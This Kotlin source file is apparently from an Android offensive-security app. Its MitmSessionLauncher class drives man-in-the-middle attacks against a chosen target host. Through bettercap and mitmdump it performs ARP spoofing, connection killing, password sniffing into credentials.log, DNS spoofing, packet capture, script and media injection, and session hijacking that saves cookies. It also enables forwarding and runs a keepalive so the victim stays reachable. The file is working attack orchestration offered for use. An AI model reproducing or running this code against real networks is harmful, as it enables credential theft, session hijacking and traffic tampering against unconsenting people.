package org.fsploit.android.data.mitm

import org.fsploit.android.R
import org.fsploit.android.core.ResourceProvider
import org.fsploit.android.domain.model.ConnectionBlockMode
import org.fsploit.android.domain.model.MitmLaunchRequest
import org.fsploit.android.domain.model.MitmMode
import org.fsploit.android.domain.model.MitmToolchainConfig
import java.io.File

class MitmSessionLauncher(
    private val resourceProvider: ResourceProvider,
    private val runtimeController: MitmRuntimeController,
    private val bettercapCapletFactory: BettercapCapletFactory,
    private val mitmdumpAddonFactory: MitmdumpAddonFactory
) {
    fun launch(
        request: MitmLaunchRequest,
        config: MitmToolchainConfig,
        targetHost: String,
        interfaceName: String,
        gatewayAddress: String,
        sessionDirectory: File,
        logFile: File
    ): MitmLaunchArtifacts {
        val state = LaunchState()
        try {
            return when (request.mode) {
                MitmMode.CONNECTION_KILL -> launchConnectionKill(
                    state = state,
                    config = config,
                    networkMode = request.networkMode,
                    interfaceName = interfaceName,
                    targetHost = targetHost,
                    gatewayAddress = gatewayAddress,
                    sessionDirectory = sessionDirectory,
                    logFile = logFile
                )

                MitmMode.SNIFFER -> launchSniffer(
                    state = state,
                    config = config,
                    networkMode = request.networkMode,
                    interfaceName = interfaceName,
                    targetHost = targetHost,
                    gatewayAddress = gatewayAddress,
                    sessionDirectory = sessionDirectory,
                    logFile = logFile
                )

                MitmMode.PASSWORD_SNIFFER -> launchPasswordSniffer(
                    state = state,
                    config = config,
                    networkMode = request.networkMode,
                    interfaceName = interfaceName,
                    targetHost = targetHost,
                    gatewayAddress = gatewayAddress,
                    sessionDirectory = sessionDirectory
                )

                MitmMode.DNS_SPOOF -> launchDnsSpoof(
                    state = state,
                    config = config,
                    networkMode = request.networkMode,
                    interfaceName = interfaceName,
                    targetHost = targetHost,
                    gatewayAddress = gatewayAddress,
                    dnsRules = request.payloadValue,
                    sessionDirectory = sessionDirectory,
                    logFile = logFile
                )

                MitmMode.REDIRECT,
                MitmMode.IMAGE_REPLACE,
                MitmMode.VIDEO_REPLACE,
                MitmMode.SCRIPT_INJECTION,
                MitmMode.CUSTOM_FILTER,
                MitmMode.SESSION_HIJACK -> launchHttpMitmMode(
                    state = state,
                    request = request,
                    config = config,
                    networkMode = request.networkMode,
                    targetHost = targetHost,
                    interfaceName = interfaceName,
                    gatewayAddress = gatewayAddress,
                    sessionDirectory = sessionDirectory,
                    logFile = logFile
                )
            }
        } catch (exception: Exception) {
            cleanup(state.toArtifacts())
            throw exception
        }
    }

    private fun launchConnectionKill(
        state: LaunchState,
        config: MitmToolchainConfig,
        networkMode: ConnectionBlockMode,
        interfaceName: String,
        targetHost: String,
        gatewayAddress: String,
        sessionDirectory: File,
        logFile: File
    ): MitmLaunchArtifacts {
        return when (networkMode) {
            ConnectionBlockMode.NORMAL -> {
                val pid = requirePid(
                    runtimeController.startBettercapCaplet(
                        config = config,
                        name = "connection_kill",
                        interfaceName = interfaceName,
                        sessionDirectory = sessionDirectory,
                        logFile = logFile,
                        capletContent = bettercapCapletFactory.buildArpBanCaplet(targetHost),
                        gatewayAddress = gatewayAddress
                    )
                )
                state.pids.add(pid)
                state.toArtifacts()
            }

            ConnectionBlockMode.HOTSPOT -> {
                if (!runtimeController.applyForwardDrop(targetHost)) {
                    throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
                }
                logFile.writeText("FORWARD DROP active for $targetHost on $interfaceName\n")
                state.forwardDropTargetHost = targetHost
                state.toArtifacts()
            }
        }
    }

    private fun launchSniffer(
        state: LaunchState,
        config: MitmToolchainConfig,
        networkMode: ConnectionBlockMode,
        interfaceName: String,
        targetHost: String,
        gatewayAddress: String,
        sessionDirectory: File,
        logFile: File
    ): MitmLaunchArtifacts {
        state.artifactPath = File(sessionDirectory, "capture.pcap").absolutePath
        ensureForwardingEnabled(state)
        if (networkMode == ConnectionBlockMode.NORMAL) {
            enableVictimForwarding(state, targetHost, interfaceName)
            val bettercapPid = requirePid(
                runtimeController.startBettercapCaplet(
                    config = config,
                    name = "spoof_relay",
                    interfaceName = interfaceName,
                    sessionDirectory = sessionDirectory,
                    logFile = logFile,
                    capletContent = bettercapCapletFactory.buildArpSpoofCaplet(targetHost, gatewayAddress),
                    gatewayAddress = gatewayAddress
                )
            )
            state.pids.add(bettercapPid)
            startKeepalive(state, targetHost, sessionDirectory)
        }

        val tcpdumpPid = requirePid(
            runtimeController.startDetachedProcess(
                name = "tcpdump_capture",
                sessionDirectory = sessionDirectory,
                logFile = File(state.artifactPath),
                body = runtimeController.buildTcpdumpScript(config, interfaceName, targetHost, state.artifactPath)
            )
        )
        state.pids.add(tcpdumpPid)
        return state.toArtifacts()
    }

    private fun launchPasswordSniffer(
        state: LaunchState,
        config: MitmToolchainConfig,
        networkMode: ConnectionBlockMode,
        interfaceName: String,
        targetHost: String,
        gatewayAddress: String,
        sessionDirectory: File
    ): MitmLaunchArtifacts {
        state.artifactPath = File(sessionDirectory, "credentials.log").absolutePath
        ensureForwardingEnabled(state)
        if (networkMode == ConnectionBlockMode.NORMAL) {
            enableVictimForwarding(state, targetHost, interfaceName)
        }
        val bettercapPid = requirePid(
            runtimeController.startBettercapCaplet(
                config = config,
                name = "password_sniff",
                interfaceName = interfaceName,
                sessionDirectory = sessionDirectory,
                logFile = File(state.artifactPath),
                capletContent = if (networkMode == ConnectionBlockMode.NORMAL) {
                    bettercapCapletFactory.buildPasswordSniffCaplet(targetHost, gatewayAddress)
                } else {
                    bettercapCapletFactory.buildHotspotPasswordSniffCaplet(targetHost)
                },
                gatewayAddress = if (networkMode == ConnectionBlockMode.NORMAL) gatewayAddress else ""
            )
        )
        state.pids.add(bettercapPid)
        if (networkMode == ConnectionBlockMode.NORMAL) {
            startKeepalive(state, targetHost, sessionDirectory)
        }
        return state.toArtifacts()
    }

    private fun launchDnsSpoof(
        state: LaunchState,
        config: MitmToolchainConfig,
        networkMode: ConnectionBlockMode,
        interfaceName: String,
        targetHost: String,
        gatewayAddress: String,
        dnsRules: String,
        sessionDirectory: File,
        logFile: File
    ): MitmLaunchArtifacts {
        if (dnsRules.trim().isEmpty()) {
            throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_dns_rules_required))
        }
        state.artifactPath = File(sessionDirectory, "dns.spoof.hosts").absolutePath
        File(state.artifactPath).writeText(bettercapCapletFactory.normalizeDnsRules(dnsRules))
        ensureForwardingEnabled(state)
        if (networkMode == ConnectionBlockMode.NORMAL) {
            enableVictimForwarding(state, targetHost, interfaceName)
        }
        val bettercapPid = requirePid(
            runtimeController.startBettercapCaplet(
                config = config,
                name = "dns_spoof",
                interfaceName = interfaceName,
                sessionDirectory = sessionDirectory,
                logFile = logFile,
                capletContent = if (networkMode == ConnectionBlockMode.NORMAL) {
                    bettercapCapletFactory.buildDnsSpoofCaplet(targetHost, gatewayAddress, state.artifactPath)
                } else {
                    bettercapCapletFactory.buildHotspotDnsSpoofCaplet(targetHost, state.artifactPath)
                },
                gatewayAddress = if (networkMode == ConnectionBlockMode.NORMAL) gatewayAddress else ""
            )
        )
        state.pids.add(bettercapPid)
        if (networkMode == ConnectionBlockMode.NORMAL) {
            startKeepalive(state, targetHost, sessionDirectory)
        }
        return state.toArtifacts()
    }

    private fun launchHttpMitmMode(
        state: LaunchState,
        request: MitmLaunchRequest,
        config: MitmToolchainConfig,
        networkMode: ConnectionBlockMode,
        targetHost: String,
        interfaceName: String,
        gatewayAddress: String,
        sessionDirectory: File,
        logFile: File
    ): MitmLaunchArtifacts {
        val addonFile = File(sessionDirectory, "mitm_addon.py")
        state.artifactPath = if (request.mode == MitmMode.SESSION_HIJACK) {
            File(sessionDirectory, "cookies.jsonl").absolutePath
        } else {
            ""
        }
        state.redirectPort = config.httpRedirectPort
        addonFile.writeText(mitmdumpAddonFactory.build(request, state.artifactPath))

        val mitmdumpPid = requirePid(
            runtimeController.startDetachedProcess(
                name = "mitmdump_http",
                sessionDirectory = sessionDirectory,
                logFile = logFile,
                body = runtimeController.buildMitmdumpScript(config, addonFile, state.redirectPort)
            )
        )
        state.pids.add(mitmdumpPid)

        ensureForwardingEnabled(state)
        runtimeController.applyPortRedirect(state.redirectPort)
        if (networkMode == ConnectionBlockMode.NORMAL) {
            enableVictimForwarding(state, targetHost, interfaceName)
            val bettercapPid = requirePid(
                runtimeController.startBettercapCaplet(
                    config = config,
                    name = "http_relay",
                    interfaceName = interfaceName,
                    sessionDirectory = sessionDirectory,
                    logFile = logFile,
                    capletContent = bettercapCapletFactory.buildArpSpoofCaplet(targetHost, gatewayAddress),
                    gatewayAddress = gatewayAddress
                )
            )
            state.pids.add(bettercapPid)
            startKeepalive(state, targetHost, sessionDirectory)
        }

        return state.toArtifacts()
    }

    private fun startKeepalive(state: LaunchState, targetHost: String, sessionDirectory: File) {
        // Best-effort: a failed keepalive must not abort the session, the capture just reverts to the
        // pre-fix "works only while the target is awake" behaviour. Tracked as a pid so the normal
        // cleanup loop tears it down with everything else.
        val pid = runtimeController.startDetachedProcess(
            name = "target_keepalive",
            sessionDirectory = sessionDirectory,
            logFile = File(sessionDirectory, "keepalive.log"),
            body = runtimeController.buildKeepaliveScript(targetHost)
        )
        if (pid != null) {
            state.pids.add(pid)
        }
    }

    private fun enableVictimForwarding(state: LaunchState, targetHost: String, interfaceName: String) {
        if (state.victimForwardingTargetHost.isNotBlank()) {
            return
        }
        if (runtimeController.applyVictimForwarding(targetHost, interfaceName)) {
            state.victimForwardingTargetHost = targetHost
            state.victimForwardingInterface = interfaceName
        }
    }

    private fun requirePid(pid: Long?): Long {
        return pid ?: throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
    }

    private fun ensureForwardingEnabled(state: LaunchState) {
        if (state.forwardingEnabled) {
            return
        }
        val previousForwardingEnabled = runtimeController.readForwardingEnabled()
            ?: throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
        if (!runtimeController.setForwarding(true)) {
            throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
        }
        state.forwardingEnabled = true
        state.previousForwardingEnabled = previousForwardingEnabled
    }

    private fun cleanup(artifacts: MitmLaunchArtifacts) {
        artifacts.pids.forEach(runtimeController::terminateProcess)
        if (artifacts.redirectPort > 0) {
            runtimeController.clearPortRedirect(artifacts.redirectPort)
        }
        if (artifacts.forwardingEnabled) {
            runtimeController.restoreForwarding(artifacts.previousForwardingEnabled ?: false)
        }
        if (artifacts.forwardDropTargetHost.isNotBlank()) {
            runtimeController.clearForwardDrop(artifacts.forwardDropTargetHost)
        }
        if (artifacts.victimForwardingTargetHost.isNotBlank()) {
            runtimeController.clearVictimForwarding(
                artifacts.victimForwardingTargetHost,
                artifacts.victimForwardingInterface
            )
        }
    }

    private class LaunchState {
        var artifactPath: String = ""
        var redirectPort: Int = 0
        var forwardingEnabled: Boolean = false
        var previousForwardingEnabled: Boolean? = null
        var forwardDropTargetHost: String = ""
        var victimForwardingTargetHost: String = ""
        var victimForwardingInterface: String = ""
        val pids = mutableListOf<Long>()

        fun toArtifacts(): MitmLaunchArtifacts {
            return MitmLaunchArtifacts(
                artifactPath = artifactPath,
                redirectPort = redirectPort,
                forwardingEnabled = forwardingEnabled,
                previousForwardingEnabled = previousForwardingEnabled,
                forwardDropTargetHost = forwardDropTargetHost,
                victimForwardingTargetHost = victimForwardingTargetHost,
                victimForwardingInterface = victimForwardingInterface,
                pids = pids.toList()
            )
        }
    }
}

data class MitmLaunchArtifacts(
    val artifactPath: String = "",
    val redirectPort: Int = 0,
    val forwardingEnabled: Boolean = false,
    val previousForwardingEnabled: Boolean? = null,
    val forwardDropTargetHost: String = "",
    val victimForwardingTargetHost: String = "",
    val victimForwardingInterface: String = "",
    val pids: List<Long> = emptyList()
)
